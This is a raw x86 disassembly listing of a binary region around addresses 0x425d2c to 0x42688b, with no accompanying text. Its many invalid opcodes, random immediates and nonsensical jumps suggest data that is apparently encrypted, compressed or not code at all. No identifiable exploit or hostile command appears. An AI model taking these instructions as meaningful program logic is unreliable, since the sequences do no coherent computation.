  425d2c:	shl    BYTE PTR [ecx-0x6e],0x97
  425d30:	retf   0x2e17
  425d33:	push   ebx
  425d34:	std    
  425d35:	add    DWORD PTR [ebp+eax*4-0x6f],edi
  425d39:	popf   
  425d3a:	push   0x29
  425d3c:	jae    0x425cd0
  425d3e:	or     BYTE PTR [eax+0x7bd8],ah
	...
  425db4:	cmp    eax,0xf361d20c
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	inc    edx
  425dc1:	and    esp,DWORD PTR ds:0x1937aca
  425dc7:	add    dh,dh
  425dc9:	add    BYTE PTR [eax],al
  425dcb:	add    al,dl
  425dcd:	jecxz  0x425e08
  425dcf:	push   0x4319f262
  425dd4:	xor    al,0xa2
  425dd6:	mov    esp,0xf07a5225
  425ddb:	sbb    esi,edi
  425ddd:	gs cmc 
  425ddf:	or     DWORD PTR [eax-0x77098aa0],esi
  425de5:	popf   
  425de6:	or     DWORD PTR [edi-0x13],0xd8290407
  425ded:	or     eax,0xda133715
  425df2:	jg     0x425d84
  425df4:	push   0x45
  425df6:	jle    0x425e5f
  425df8:	ja     0x425e3d
  425dfa:	in     eax,0xf9
  425dfc:	xor    dl,BYTE PTR [esi-0x46ab3935]
  425e02:	(bad)  
  425e03:	fmul   QWORD PTR [eax-0x59]
  425e06:	clc    
  425e07:	shl    cl,cl
  425e09:	cdq    
  425e0a:	cwde   
  425e0b:	jle    0x425dd7
  425e0d:	mov    edi,0x28622dbc
  425e12:	or     eax,0xc5d94a71
  425e17:	mov    al,0xeb
  425e19:	xchg   ebx,ebp
  425e1b:	pop    esp
  425e1c:	xchg   esi,eax
  425e1d:	xor    DWORD PTR [ecx-0x17],eax
  425e20:	add    ch,BYTE PTR [ecx-0x7b3d411e]
  425e26:	sbb    ah,BYTE PTR [edx]
  425e28:	outs   dx,DWORD PTR ds:[esi]
  425e29:	in     al,dx
  425e2a:	adc    edi,DWORD PTR [eax+0x10dfe9f5]
  425e30:	mov    ch,0xf6
  425e32:	mov    ds:0x7897d88d,al
  425e37:	fidivr WORD PTR [ecx]
  425e39:	call   0x900544da
  425e3e:	psubusw mm7,QWORD PTR [ecx-0x660c8553]
  425e45:	mov    bl,bh
  425e47:	test   esp,esp
  425e49:	int3   
  425e4a:	or     al,0xbd
  425e4c:	mov    al,ds:0xa8e75353
  425e51:	mov    ecx,0xdeb1ad7b
  425e56:	(bad)  
  425e57:	jecxz  0x425e0e
  425e59:	push   cs
  425e5a:	int3   
  425e5b:	inc    ecx
  425e5c:	jmp    0x9ebd6b3d
  425e61:	xchg   esi,eax
  425e62:	loop   0x425eb6
  425e64:	sub    esi,eax
  425e66:	je     0x425edb
  425e68:	shr    DWORD PTR [bx+si-0x5c],0xb7
  425e6d:	cwde   
  425e6e:	jno    0x425ed5
  425e70:	inc    ecx
  425e71:	adc    esp,edx
  425e73:	mov    BYTE PTR [edi+0x42c48f33],dh
  425e79:	mov    al,0xbe
  425e7b:	test   al,0x28
  425e7d:	add    BYTE PTR [edi-0x7977cd73],bl
  425e83:	or     bh,BYTE PTR [ebp-0x6f5fdb7f]
  425e89:	or     BYTE PTR [edx+edx*4+0x395f7bcc],0xae
  425e91:	push   eax
  425e92:	mov    esi,0xf90d63e5
  425e97:	inc    edi
  425e98:	fdivrp st(5),st
  425e9a:	in     eax,dx
  425e9b:	mov    fs,WORD PTR [esi+ebx*8]
  425e9e:	jnp    0x425f11
  425ea0:	inc    ecx
  425ea1:	xchg   ebp,eax
  425ea2:	inc    esp
  425ea3:	pop    esp
  425ea4:	fist   WORD PTR [esi+0x17e9cf82]
  425eaa:	xchg   edi,eax
  425eab:	cmp    DWORD PTR [ecx-0x2a],esp
  425eae:	sbb    BYTE PTR [ebx+0x1dd4fa97],ah
  425eb4:	arpl   WORD PTR [ebx],si
  425eb6:	jg     0x425f17
  425eb8:	icebp  
  425eb9:	fs jge 0x425e61
  425ebc:	or     al,0xed
  425ebe:	mov    ecx,0x1f40cb
	...
  425f33:	add    BYTE PTR [ebx+0x16],cl
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx+0x51]
  425f41:	or     BYTE PTR [ecx],cl
  425f43:	mov    dh,0x70
  425f45:	xchg   esp,eax
  425f46:	add    DWORD PTR [eax],eax
  425f48:	test   BYTE PTR [eax],0x0
  425f4b:	add    BYTE PTR [edi-0x2e69868b],dh
  425f51:	iret   
  425f52:	cs sbb eax,0x2e381f4a
  425f58:	neg    DWORD PTR ds:0x777e1bc3
  425f5e:	adc    ah,BYTE PTR [ebx-0x72]
  425f61:	imul   edx,DWORD PTR [ecx],0x6f
  425f64:	and    ch,bl
  425f66:	pushf  
  425f67:	enter  0x1d18,0x10
  425f6b:	leave  
  425f6c:	imul   ebx,DWORD PTR [edx+ebp*2],0xc26fd0a2
  425f73:	scas   eax,DWORD PTR es:[edi]
  425f74:	int3   
  425f75:	aas    
  425f76:	mov    BYTE PTR [ebx],ch
  425f78:	iret   
  425f79:	jo     0x425f07
  425f7b:	out    dx,al
  425f7c:	stc    
  425f7d:	retf   0xdcfb
  425f80:	xor    eax,0xe2e47eef
  425f85:	shl    ah,0xb1
  425f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f89:	mov    edx,0x916e3a50
  425f8e:	adc    BYTE PTR [esp+ecx*1+0x78f126f8],0x82
  425f96:	lea    eax,[ecx+ecx*4+0x63]
  425f9a:	ja     0x425fb7
  425f9c:	dec    edi
  425f9d:	mov    esp,0x3e5a8052
  425fa2:	inc    edi
  425fa3:	sahf   
  425fa4:	popf   
  425fa5:	mov    ebp,0x76094064
  425faa:	sar    BYTE PTR [edi],cl
  425fac:	ins    DWORD PTR es:[edi],dx
  425fad:	or     ebx,esi
  425faf:	(bad)  
  425fb0:	sar    dh,0x20
  425fb3:	and    al,0x7
  425fb5:	cmp    BYTE PTR [eax+0x644c2107],dh
  425fbb:	fistp  QWORD PTR gs:[ebx+0x3f]
  425fbf:	lds    ebx,FWORD PTR [eax+0x57489aaa]
  425fc5:	and    DWORD PTR [edx-0x28],0x48781768
  425fcc:	stos   DWORD PTR es:[edi],eax
  425fcd:	cli    
  425fce:	add    BYTE PTR [ecx+0x71397f53],cl
  425fd4:	push   edx
  425fd5:	jbe    0x426036
  425fd7:	and    edi,DWORD PTR [ecx]
  425fd9:	pop    es
  425fda:	adc    al,BYTE PTR [ebx+0x108c3c01]
  425fe0:	add    esp,ebp
  425fe2:	pop    esp
  425fe3:	pop    edi
  425fe4:	xor    DWORD PTR [ecx+0x28aba1bc],esi
  425fea:	or     ebx,esp
  425fec:	fidivr DWORD PTR [ebx]
  425fee:	mov    cl,0x40
  425ff0:	ins    BYTE PTR es:[edi],dx
  425ff1:	jns    0x42606b
  425ff3:	inc    eax
  425ff4:	and    bl,BYTE PTR [edi+ecx*1]
  425ff7:	cbw    
  425ff9:	dec    edi
  425ffa:	std    
  425ffb:	or     eax,0xd25002b6
  426000:	mov    bh,0x2
  426002:	xchg   DWORD PTR [esi-0xc],ebp
  426005:	(bad)  
  426006:	aas    
  426007:	frstor [eax*8+0x27ad33f6]
  42600e:	in     eax,dx
  42600f:	outs   dx,DWORD PTR ds:[esi]
  426010:	leave  
  426011:	mov    bl,0x68
  426013:	pop    es
  426014:	(bad)  
  426016:	loope  0x42603b
  426018:	test   al,0x46
  42601a:	mov    bh,0xa9
  42601c:	add    BYTE PTR [edx],dh
  42601e:	out    0xea,al
  426020:	sub    BYTE PTR [edx],cl
  426022:	test   BYTE PTR [ebp+0x5c],bh
  426025:	mov    edx,0x9918b21f
  42602a:	pop    ds
  42602b:	(bad)  
  42602c:	icebp  
  42602d:	cli    
  42602e:	fbld   TBYTE PTR [edx]
  426030:	mov    ds:0x8ec695f0,eax
  426035:	sbb    bh,dl
  426037:	aaa    
  426038:	call   0x6b512852
  42603d:	mov    cl,0xe4
  42603f:	test   al,0xac
  426041:	call   0x426046
	...
  4260b2:	add    BYTE PTR [eax],al
  4260b4:	ficom  WORD PTR [ecx]
  4260b6:	lahf   
  4260b7:	and    ebx,edi
  4260b9:	scas   eax,DWORD PTR es:[edi]
  4260ba:	(bad)  
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0x31b7dfbb
  4260c4:	xchg   bp,ax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	test   BYTE PTR [eax],0x0
  4260cb:	add    ah,dh
  4260cd:	inc    edi
  4260ce:	rcl    ah,cl
  4260d0:	pushf  
  4260d1:	sbb    DWORD PTR [eax+edx*4],esp
  4260d4:	or     DWORD PTR [ecx],ecx
  4260d6:	cdq    
  4260d7:	add    BYTE PTR [edx-0x530d7952],al
  4260dd:	xchg   ch,cl
  4260df:	pop    esp
  4260e0:	hlt    
  4260e1:	pop    ss
  4260e2:	cmp    cl,BYTE PTR [ecx+0x3f]
  4260e5:	in     al,0x52
  4260e7:	dec    edi
  4260e8:	aaa    
  4260e9:	and    BYTE PTR [ecx-0x1a4c729],cl
  4260ef:	xchg   DWORD PTR [ecx+0x1a7072b6],edi
  4260f5:	rcr    DWORD PTR ds:0x70860c8,cl
  4260fb:	and    DWORD PTR [ecx+eiz*2+0x36],edx
  4260ff:	jp     0x4260ca
  426101:	ret    
  426102:	popa   
  426103:	mov    cl,0xda
  426105:	xchg   ebx,eax
  426106:	stc    
  426107:	in     al,dx
  426108:	ficom  DWORD PTR [esi]
  42610a:	mov    esp,0xee1f57b9
  42610f:	xor    al,bl
  426111:	pop    edi
  426112:	clc    
  426113:	fdiv   DWORD PTR [ebx]
  426115:	xor    al,0x42
  426117:	iret   
  426118:	pop    ebx
  426119:	out    dx,al
  42611a:	fild   DWORD PTR [ebx-0x4a83ded7]
  426120:	repnz les esi,FWORD PTR ds:0x94a94ff
  426127:	popf   
  426128:	popf   
  426129:	ds inc edx
  42612b:	mov    esp,0xef24d307
  426130:	lds    edi,FWORD PTR [esi+0x1b]
  426133:	(bad)  
  426134:	xchg   esp,eax
  426135:	int3   
  426136:	adc    DWORD PTR [ebp-0x7],ebx
  426139:	in     al,dx
  42613a:	bound  esp,QWORD PTR [esi-0xe]
  42613d:	adc    dh,bh
  42613f:	push   0xffffffde
  426141:	pushf  
  426142:	dec    ecx
  426143:	ror    DWORD PTR [ebp-0x4f35c4b4],1
  426149:	sbb    DWORD PTR [esi+0x38],0x4
  42614d:	pop    ss
  42614e:	jae    0x4261ca
  426150:	in     eax,dx
  426151:	cs add eax,0x162fcf8d
  426157:	xor    esi,DWORD PTR [edi]
  426159:	ja     0x42614b
  42615b:	pusha  
  42615c:	sti    
  42615d:	pop    ss
  42615e:	out    dx,al
  42615f:	pop    edx
  426160:	pop    ecx
  426161:	mov    ah,0x5f
  426163:	nop
  426164:	lock push 0x3bd1d807
  42616a:	call   0xe5ac:0x98c103f7
  426171:	ror    BYTE PTR [ebx],1
  426173:	mov    cs,WORD PTR [edx]
  426175:	xchg   edx,eax
  426176:	push   ss
  426177:	jnp    0x426194
  426179:	addr16 int3 
  42617b:	out    0xd1,al
  42617d:	inc    edx
  42617e:	and    DWORD PTR [ecx+0x63],esp
  426181:	push   esp
  426182:	retf   
  426183:	repz inc esp
  426185:	pop    edx
  426186:	iret   
  426187:	pop    ebx
  426188:	loopne 0x4261e0
  42618a:	fld    DWORD PTR [esi]
  42618c:	popa   
  42618d:	iret   
  42618e:	aam    0x18
  426190:	inc    ebp
  426191:	scas   eax,DWORD PTR es:[edi]
  426192:	in     al,0x88
  426194:	jg     0x4261ed
  426196:	mov    ebx,0xbb41a55a
  42619b:	mov    ah,0x67
  42619d:	jbe    0x4261b7
  42619f:	pop    eax
  4261a0:	fxtract 
  4261a2:	sbb    DWORD PTR [bx+di],ebp
  4261a5:	outs   dx,BYTE PTR ds:[esi]
  4261a6:	mov    ecx,0xa54b685
  4261ab:	sbb    ebp,edi
  4261ad:	mov    ecx,0x3fae7341
  4261b2:	hlt    
  4261b3:	iret   
  4261b4:	pop    edi
  4261b5:	nop
  4261b6:	retf   0xdd37
  4261b9:	inc    edx
  4261ba:	dec    eax
  4261bb:	and    esp,eax
  4261bd:	into   
  4261be:	mov    ds:0xcbe7d8,eax
	...
  426233:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0x5
  426241:	out    dx,eax
  426242:	lods   eax,DWORD PTR ds:[esi]
  426243:	pop    ecx
  426244:	pop    esp
  426245:	xchg   esi,eax
  426246:	add    DWORD PTR [eax],eax
  426248:	test   BYTE PTR [eax],0x0
  42624b:	add    cl,cl
  42624d:	pop    esp
  42624e:	xchg   ebx,eax
  42624f:	(bad)
  426253:	sub    BYTE PTR [edi-0x28fcf6c],bh
  426259:	pop    ebp
  42625a:	shl    bh,cl
  42625c:	dec    esi
  42625d:	sbb    BYTE PTR [edx+0x59f72317],dh
  426263:	mov    esi,0x3bf72c54
  426268:	cmp    al,0x78
  42626a:	fdivr  DWORD PTR [edi+0x4f3f8602]
  426270:	bound  eax,QWORD PTR [ecx]
  426272:	mov    esi,0xb605e829
  426277:	test   DWORD PTR [edx-0x644a13a7],esp
  42627d:	idiv   eax
  42627f:	addr16 inc esi
  426281:	pop    ss
  426282:	xor    al,0x1
  426284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426285:	sub    al,0x88
  426287:	jmp    0x745ac3a4
  42628c:	sub    eax,0x6b9783db
  426291:	fs ret 
  426293:	xor    eax,0xd600d665
  426298:	add    eax,0xf645d273
  42629d:	les    ebx,FWORD PTR [ebx-0x41]
  4262a0:	sahf   
  4262a1:	xchg   ebp,eax
  4262a2:	push   0xffffff80
  4262a4:	jmp    0xb7ff:0x8496ea1b
  4262ab:	out    0x61,eax
  4262ad:	repnz xchg ebx,eax
  4262af:	jno    0x426300
  4262b1:	int3   
  4262b2:	outs   dx,BYTE PTR ds:[esi]
  4262b3:	adc    bl,BYTE PTR [ecx-0x2f]
  4262b6:	es mov bh,0xf5
  4262b9:	push   cs
  4262ba:	fld    QWORD PTR [ebx+eax*1]
  4262bd:	mov    esp,0xacbbe55a
  4262c2:	call   0x8c76:0xfda5d95c
  4262c9:	pushf  
  4262ca:	mov    ecx,0x8ca60b0e
  4262cf:	scas   al,BYTE PTR es:[edi]
  4262d0:	xchg   edi,eax
  4262d1:	fwait
  4262d2:	imul   edi,DWORD PTR [esi+eiz*1+0x4d358cd4],0xe3202714
  4262dd:	xor    BYTE PTR [edi],bl
  4262df:	test   eax,ecx
  4262e1:	dec    eax
  4262e2:	in     eax,0xf8
  4262e4:	jge    0x4262ea
  4262e6:	adc    ah,BYTE PTR [esi+0x66]
  4262e9:	xchg   ecx,eax
  4262ea:	or     edx,ebp
  4262ec:	sahf   
  4262ed:	xor    BYTE PTR [edx],dl
  4262ef:	sbb    al,0xa0
  4262f1:	inc    ecx
  4262f2:	mov    ebp,0x30260715
  4262f7:	fcomp  DWORD PTR [eax+0x3e]
  4262fa:	cs (bad) 
  4262fc:	repz jbe 0x426300
  4262ff:	pop    ds
  426300:	pop    ecx
  426301:	sbb    esi,DWORD PTR [ecx]
  426303:	dec    esi
  426304:	dec    esi
  426305:	xor    eax,0x587169f2
  42630a:	pop    ds
  42630b:	add    ecx,ebx
  42630d:	enter  0x34bf,0xc8
  426311:	pop    es
  426312:	test   al,0xef
  426314:	pop    ecx
  426315:	jg     0x426313
  426317:	cmp    DWORD PTR ds:0x93bdddd3,edx
  42631d:	loope  0x4262c4
  42631f:	out    0xb1,al
  426321:	sahf   
  426322:	out    0x26,al
  426324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426325:	bound  ecx,QWORD PTR [eax]
  426327:	in     eax,dx
  426328:	in     al,0xcc
  42632a:	sub    al,0xc2
  42632c:	sbb    al,0x7c
  42632e:	jmp    0x1030:0x3d38ed4d
  426335:	or     eax,0x434eac68
  42633a:	jge    0x4262c5
  42633c:	ds inc ecx
  42633e:	add    dh,BYTE PTR [ebx]
  426340:	push   edx
  426341:	sbb    al,BYTE PTR [eax]
	...
  4263b3:	add    BYTE PTR [edx+0x9],al
  4263b6:	les    ebp,FWORD PTR [ecx-0x14901231]
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	fiadd  DWORD PTR [esi*8+0x1975238]
  4263c7:	add    dh,dh
  4263c9:	add    BYTE PTR [eax],al
  4263cb:	add    BYTE PTR [esi],bh
  4263cd:	sub    DWORD PTR [ecx],ebp
  4263cf:	and    al,0x4c
  4263d1:	adc    al,0xeb
  4263d3:	stc    
  4263d4:	out    0x5b,eax
  4263d6:	xchg   edx,eax
  4263d7:	xor    eax,0x799c6647
  4263dc:	jp     0x4263a7
  4263de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263df:	add    BYTE PTR [ebx-0x20eecaa2],0x90
  4263e6:	ja     0x426368
  4263e8:	mov    edi,es
  4263ea:	mov    edx,0x9f4edfb0
  4263ef:	dec    ecx
  4263f0:	sub    eax,0x6b4ae079
  4263f5:	out    dx,eax
  4263f6:	mov    al,0x4d
  4263f8:	retf   
  4263f9:	loope  0x4263ef
  4263fb:	jno    0x42644d
  4263fd:	add    bh,BYTE PTR [ebp-0x24880fd]
  426403:	and    eax,0xafcb786
  426408:	mov    ds:0x4779ab6d,al
  42640d:	xchg   ecx,eax
  42640e:	pop    esp
  42640f:	pop    edx
  426410:	rcr    dl,0x94
  426413:	xchg   ebx,eax
  426414:	mov    ebp,0x769cda18
  426419:	pop    esp
  42641a:	popf   
  42641b:	popf   
  42641c:	je     0x426413
  42641e:	dec    eax
  42641f:	mov    bl,0xac
  426421:	mov    ch,0xf4
  426423:	inc    edi
  426424:	or     edx,DWORD PTR [ebx+edx*1+0x3]
  426428:	into   
  426429:	rcl    DWORD PTR [ebx+0x1c],1
  42642c:	into   
  42642d:	dec    esi
  42642e:	mov    ecx,0xbe54c2bf
  426433:	xor    eax,0x5b26da6f
  426438:	in     al,0x4f
  42643a:	out    0x93,eax
  42643c:	xchg   ebx,eax
  42643d:	ja     0x4263c0
  42643f:	jns    0x426486
  426441:	inc    esp
  426442:	jecxz  0x426472
  426444:	stos   BYTE PTR es:[edi],al
  426445:	sub    al,0xb3
  426447:	ret    0xdb0a
  42644a:	mov    ebx,0xe3fbe857
  42644f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426450:	lock int 0xf1
  426453:	repnz or BYTE PTR [ebp+0x71069a29],bh
  42645a:	shl    DWORD PTR [esi-0x47d41fb4],1
  426460:	cmp    ebp,DWORD PTR [eax-0x71]
  426463:	pop    ecx
  426464:	xor    al,0x8d
  426466:	sti    
  426467:	dec    edx
  426468:	inc    esi
  426469:	lock xchg edx,eax
  42646b:	cmp    bh,BYTE PTR [ebx+edx*2-0x7]
  42646f:	ss inc esi
  426471:	add    esp,DWORD PTR [eax-0x7d]
  426474:	jnp    0x4264a8
  426476:	xor    DWORD PTR [edx+0x38],eax
  426479:	mov    esi,0x1a41ac1c
  42647e:	rcr    BYTE PTR [eax],cl
  426480:	or     esi,DWORD PTR [ebp+0x11090fc5]
  426486:	sbb    esp,ebx
  426488:	(bad)  [eax+eax*8+0x32]
  42648c:	pop    ebp
  42648d:	jne    0x42641f
  42648f:	push   eax
  426490:	ss inc ecx
  426492:	lods   al,BYTE PTR ds:[esi]
  426493:	sub    al,0x1e
  426495:	mov    DWORD PTR [esi+edx*1-0x146a5159],edi
  42649c:	jmp    edx
  42649e:	push   ebx
  42649f:	cmove  esp,DWORD PTR [ebx+ebx*4-0x5f]
  4264a4:	add    BYTE PTR [edx],0x1
  4264a7:	imul   ebx,DWORD PTR [eax-0x2fcad39c],0xffffffa5
  4264ae:	(bad)  
  4264af:	xor    BYTE PTR [ebp+edi*1+0x3d81505b],cl
  4264b6:	dec    ebx
  4264b7:	mov    ah,0xc4
  4264b9:	sub    cl,BYTE PTR [edi+0x30]
  4264bc:	scas   al,BYTE PTR es:[edi]
  4264bd:	pop    eax
  4264be:	stc    
  4264bf:	add    ecx,ebp
  4264c1:	xchg   ebp,eax
	...
  426532:	add    BYTE PTR [eax],al
  426534:	(bad)  
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	js     0x426563
  426542:	popa   
  426543:	sub    al,0x48
  426545:	cwde   
  426546:	add    DWORD PTR [eax],eax
  426548:	test   BYTE PTR [eax],0x0
  42654b:	add    BYTE PTR [eax],cl
  42654d:	sbb    ah,BYTE PTR [esi+0x13]
  426550:	retf   
  426551:	lea    ebp,[esi+ecx*1+0x1e]
  426555:	pushf  
  426556:	nop
  426557:	fsubr  QWORD PTR [edi+0x50]
  42655a:	mov    ?,WORD PTR [edi+0x49]
  42655d:	jbe    0x426584
  42655f:	gs push cs
  426561:	cwde   
  426562:	ins    BYTE PTR es:[edi],dx
  426563:	mov    ebp,0xedaa5b12
  426568:	xchg   edx,eax
  426569:	cmp    al,0xeb
  42656b:	gs hlt 
  42656d:	and    eax,0xc4319dd8
  426572:	scas   al,BYTE PTR es:[edi]
  426573:	leave  
  426574:	mov    ds:0xe84967cf,al
  426579:	jl     0x426548
  42657b:	aad    0x77
  42657d:	out    dx,al
  42657e:	cdq    
  42657f:	push   esi
  426580:	imul   edx,DWORD PTR [eax],0x4f
  426583:	pop    ebp
  426584:	test   BYTE PTR [ecx+0x3c75b0e1],ch
  42658a:	inc    ecx
  42658b:	int    0x11
  42658d:	add    al,0x34
  42658f:	push   eax
  426590:	sbb    DWORD PTR [edx],edx
  426592:	dec    esi
  426593:	mov    ss,WORD PTR [eax+ebx*4-0x19]
  426597:	not    BYTE PTR [ecx+0x19]
  42659a:	addr16 dec esi
  42659c:	jmp    0x426567
  42659e:	dec    ebx
  42659f:	adc    BYTE PTR [esi+0x17],bl
  4265a2:	jmp    0xe94d5cae
  4265a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265a8:	lock fdivr st,st(0)
  4265ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265ac:	inc    esi
  4265ad:	jbe    0x4265fa
  4265af:	sbb    ebx,DWORD PTR [edx-0x2]
  4265b2:	xor    eax,0x3775fe91
  4265b7:	add    edi,DWORD PTR [eax+0x613adf21]
  4265bd:	cs out 0xac,al
  4265c0:	mov    esi,0x82d97e3c
  4265c5:	fimul  WORD PTR [ebp+0x356a7361]
  4265cb:	cdq    
  4265cc:	mov    esi,0xc201affb
  4265d1:	call   0x2f34f9e9
  4265d6:	rcr    edi,1
  4265d8:	scas   al,BYTE PTR es:[edi]
  4265d9:	repnz add ebp,edi
  4265dc:	rcr    DWORD PTR [esi+0x46],1
  4265df:	sub    BYTE PTR [eax-0x62],0x2d
  4265e3:	inc    esp
  4265e4:	add    bh,bh
  4265e6:	mov    cl,0x32
  4265e8:	dec    esp
  4265e9:	add    BYTE PTR [esi+0x71],ch
  4265ec:	push   ds
  4265ed:	dec    eax
  4265ee:	daa    
  4265ef:	adc    al,0xfd
  4265f1:	jne    0x4265b0
  4265f3:	push   eax
  4265f4:	cli    
  4265f5:	test   al,0xb7
  4265f7:	int    0x1a
  4265f9:	mov    eax,ds:0xc6592f96
  4265fe:	div    DWORD PTR [ecx]
  426600:	mov    al,0x69
  426602:	(bad)  
  426603:	fiadd  DWORD PTR [esp+esi*1]
  426606:	push   esp
  426607:	add    al,0x9f
  426609:	jl     0x426620
  42660b:	pop    ss
  42660c:	imul   DWORD PTR [ebp-0x47]
  42660f:	cld    
  426610:	mov    eax,0x8896b0fc
  426615:	adc    edx,DWORD PTR [esp-0x18]
  426619:	and    BYTE PTR [eax],ah
  42661b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42661c:	sahf   
  42661d:	pop    ss
  42661e:	loop   0x426638
  426620:	mov    dl,0xb0
  426622:	mul    DWORD PTR [eax+0x3]
  426625:	arpl   WORD PTR [eax+eax*8-0x1b],si
  426629:	and    eax,0x343b562c
  42662e:	mov    BYTE PTR [eax-0x5e],dh
  426631:	add    bl,BYTE PTR [eax]
  426633:	iret   
  426634:	jl     0x42661b
  426636:	mov    esi,0x82b4eb02
  42663b:	mov    ah,0x73
  42663d:	jns    0x4266ab
  42663f:	xchg   esp,eax
  426640:	adc    ebx,DWORD PTR [edx+0x0]
	...
  4266b3:	add    dh,dl
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	fbstp  TBYTE PTR [eax-0x66c1dd3f]
  4266c6:	add    DWORD PTR [eax],eax
  4266c8:	test   BYTE PTR [eax],0x0
  4266cb:	add    BYTE PTR [eax-0x5443c61e],dh
  4266d1:	push   cs
  4266d2:	mov    ah,0x28
  4266d4:	jbe    0x4266c5
  4266d6:	inc    esi
  4266d7:	movzx  esi,BYTE PTR [esi]
  4266da:	adc    bl,ch
  4266dc:	add    eax,0xcf596f99
  4266e1:	repnz gs cld 
  4266e4:	nop
  4266e5:	or     esi,edi
  4266e7:	sub    ebp,DWORD PTR [eax+0x386f2ad1]
  4266ed:	add    eax,ebx
  4266ef:	pop    esp
  4266f0:	jno    0x4266f6
  4266f2:	add    DWORD PTR [ebp+0x184e5efd],ebp
  4266f8:	mov    edi,0x9ff9281b
  4266fd:	gs mov cl,0xd
  426700:	shr    BYTE PTR [edi+edx*4],cl
  426703:	dec    eax
  426704:	push   0x49
  426706:	lds    ebp,FWORD PTR [edx+0x49ab00d5]
  42670c:	loop   0x4266b9
  42670e:	neg    BYTE PTR [eax]
  426710:	xor    ch,BYTE PTR [eax]
  426712:	add    al,0x8d
  426714:	loope  0x426743
  426716:	in     eax,0x9b
  426718:	jmp    0x32ca3088
  42671d:	retf   
  42671e:	push   esp
  42671f:	imul   ebp,DWORD PTR [ebx+0x4c],0xdb9b7ef3
  426726:	sahf   
  426727:	(bad)  
  426728:	ficom  DWORD PTR [edi]
  42672a:	cmp    DWORD PTR [ecx],edi
  42672c:	and    BYTE PTR [edi],bl
  42672e:	leave  
  42672f:	mov    bh,0x27
  426731:	into   
  426732:	inc    ebp
  426733:	pop    ecx
  426734:	hlt    
  426735:	sub    ebp,DWORD PTR [ebp-0x1a0b447c]
  42673b:	retf   
  42673c:	mov    edx,0xd65554ba
  426741:	jne    0x42678e
  426743:	jecxz  0x42678d
  426745:	stc    
  426746:	inc    edi
  426747:	es popa 
  426749:	aad    0xd0
  42674b:	mov    eax,0x3962cdc3
  426750:	inc    BYTE PTR [ecx+edi*1-0x3bb6f2b0]
  426757:	xor    edx,DWORD PTR [esp+ebp*1]
  42675a:	pop    eax
  42675b:	fucomi st,st(4)
  42675d:	adc    ecx,DWORD PTR [eax+eax*4+0xcd829fd]
  426764:	idiv   DWORD PTR [edx-0x280a8c9f]
  42676a:	and    dh,BYTE PTR [ebp-0x79f43890]
  426770:	xchg   edx,eax
  426771:	fnsave ds:0x88691138
  426777:	out    0x49,eax
  426779:	loop   0x42674e
  42677b:	xchg   esp,eax
  42677c:	(bad)  
  42677d:	out    dx,al
  42677e:	ret    0x301f
  426781:	fsubr  st(4),st
  426783:	mov    ?,WORD PTR [edx-0x481cf262]
  426789:	and    DWORD PTR [ecx],ecx
  42678b:	rep stos BYTE PTR es:[edi],al
  42678d:	dec    ebx
  42678e:	pop    edi
  42678f:	mov    ah,0x1c
  426791:	jne    0x42676a
  426793:	xchg   BYTE PTR [ecx],bh
  426795:	in     eax,dx
  426796:	xor    DWORD PTR [ecx-0x583e76d1],ebx
  42679c:	xchg   ebp,eax
  42679d:	(bad)  
  42679e:	xor    DWORD PTR [ebx+0x6d],ebx
  4267a1:	leave  
  4267a2:	popf   
  4267a3:	rcr    al,0x4
  4267a6:	retf   
  4267a7:	fcmovne st,st(4)
  4267a9:	mov    ecx,0x4522f9a6
  4267ae:	jmp    0x4267b0
  4267b0:	xor    BYTE PTR ds:0xf58634c1,ch
  4267b6:	daa    
  4267b7:	sub    eax,0xa5c6e0cc
  4267bc:	into   
  4267bd:	sub    BYTE PTR [eax-0x2b],bh
  4267c0:	(bad)  
  4267c1:	inc    esp
	...
  426832:	add    BYTE PTR [eax],al
  426834:	pop    esp
  426835:	push   edx
  426836:	nop
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x7f078334],cl
  426843:	outs   dx,DWORD PTR ds:[esi]
  426844:	xor    al,0x9a
  426846:	add    DWORD PTR [eax],eax
  426848:	test   BYTE PTR [eax],0x0
  42684b:	add    dl,cl
  42684d:	adc    DWORD PTR [edx-0x25a224fc],esp
  426853:	ret    0xdbec
  426856:	xor    BYTE PTR [ebx],dl
  426858:	sub    al,0xb0
  42685a:	jae    0x4267f9
  42685c:	jl     0x42683c
  42685e:	arpl   cx,bp
  426860:	jmp    0xb5988093
  426865:	cld    
  426866:	or     BYTE PTR [eax],al
  426868:	in     eax,dx
  426869:	pop    edx
  42686a:	adc    eax,0x2e0556ba
  42686f:	int    0xec
  426871:	stos   BYTE PTR es:[edi],al
  426872:	pop    eax
  426873:	mov    eax,ds:0xb033a4f8
  426878:	leave  
  426879:	or     al,0xf9
  42687b:	aas    
  42687c:	mov    dl,0xba
  42687e:	mov    dh,0xcc
  426880:	fsubr  QWORD PTR [ecx]
  426882:	inc    esp
  426883:	pop    ss
  426884:	and    eax,0x2285f49c
  426889:	lods   al,BYTE PTR ds:[esi]
  42688a:	lahf   
  42688b:	out    0x28,al
